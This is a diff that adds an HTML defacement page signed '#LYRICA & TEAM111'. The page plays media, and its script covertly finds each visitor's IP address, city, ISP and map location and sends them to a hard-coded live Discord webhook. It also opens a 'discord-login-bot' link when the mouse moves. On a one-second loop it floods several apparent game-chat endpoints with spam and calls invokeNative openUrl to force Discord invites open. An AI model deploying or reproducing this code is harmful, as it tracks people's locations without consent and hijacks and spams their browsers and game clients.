@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>#lyrica</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 91vh;
+            overflow: hidden;
+            flex-direction: column;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+        .anime-image {
+            width: 554px; /* تم تصغير الصورة */
+            max-width: 100%; /* لتناسب جميع الشاشات */
+            border: 3px solid #333;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0.8;
+        }
+        .info {
+            margin-top: 10px;
+            font-size: 1.2rem;
+        }
+        .link {
+            margin-top: 10px;
+            font-size: 1.5rem;
+            color: #00f;
+            text-decoration: none;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+        .decorative-text {
+            margin-top: 20px;
+            font-size: 1.0rem;
+            font-style: italic;
+            font-weight: bold;
+            text-shadow: 0 0 2px #00f;
+            animation: rgbColorChange 6s linear infinite;
+        }
+        @keyframes rgbColorChange {
+            0%   { color: rgb(255, 0, 0); }
+            33%  { color: rgb(0, 255, 0); }
+            66%  { color: rgb(0, 0, 255); }
+            100% { color: rgb(255, 0, 0); }
+        }
+        .signature-text {
+            margin-top: 10px;
+            color: #00f;
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px #00f;
+        }
+        pre {
+            color: white;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 15px;
+        }
+    </style>
+</head>
+<body>
+    <video class="background" autoplay muted loop>
+        <source src="https://cdn.discordapp.com/attachments/126111958574387241/1305252891518439424/-_-_2020_-_.mp4" type="video/mp4" />
+    </video>
+
+    <div class="container">
+        <img class="anime-image" src="https://i.top4top.io/p_3540q23pt1.gif" alt="Anime" />
+
+        <div class="media-container">
+            <audio autoplay loop>
+                <source src="https://d.top4top.io/m_3540rn7sq1.mp3" />
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+
+        <div class="decorative-text">
+            <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span><br />
+            <b>IP Information:</b>
+            <pre id="ip-info">Fetching...</pre>
+        </div>
+
+        <div class="decorative-text">
+            <p>You Get Hacking By #LYRICA & TEAM111</p>
+            <p>discord.gg/T111</p>
+        </div>
+
+        <div class="signature-text">
+            <p></p>
+        </div>
+    </div>
+
+
+
+
+    <script>
+        // منع التحديد
+        var omitformtags = ['input', 'textarea', 'select'].join('|');
+        function disableselect(e) {
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
+                return false;
+        }
+        function reEnable() { return true; }
+        if (typeof document.onselectstart != 'undefined')
+            document.onselectstart = function () { return false; };
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // جلب IP والمعلومات
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then((response) => response.json())
+                .then((data) => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
+                .then((response) => response.json())
+                .then((ipInfoData) => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "Visitor");
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        function sendToDiscord(ipInfoData, googleMapsLink, username) {
+            const webhookURL = "https://discord.com/api/webhooks/1415231483613810708/I4uAnLYqkHIGGjhJFwId-jH8vbnqL5rV_YFxMjMfnC3qjZMu7HFl11nvxcjignfmqH77";
+            const payload = {
+                content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
+            };
+            fetch(webhookURL, { 
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(() => console.log("IP sent to Discord!"))
+            .catch(error => console.error(error));
+        }
+
+        fetchIPAndInfo();
+
+        // فتح روابط عند تحريك الماوس
+        let triggered = false;
+        window.addEventListener('mousemove', () => {
+            if (!triggered) {
+                triggered = true;
+                window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
+                window.open('https://discord.gg/T111', '_blank');
+            }
+        });
+
+        // زر الخروج
+        document.getElementById('exitButton').addEventListener('click', () => {
+            window.open('https://discord.gg/T111', '_blank');
+            window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
+            alert('اضغط OK للخروج من الشاشة');
+        });
+    </script>
+<script>
+const msg = `👑 TEAM 111 IS HERE 👑`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/T111");
+window.invokeNative("openUrl", "https://discord.gg/T111");
+window.invokeNative("openUrl", "https://discord.gg/T111");
+window.invokeNative("openUrl", "https://discord.gg/T111");
+}, 1000);
+    </script>
+
+</body>
+</html>
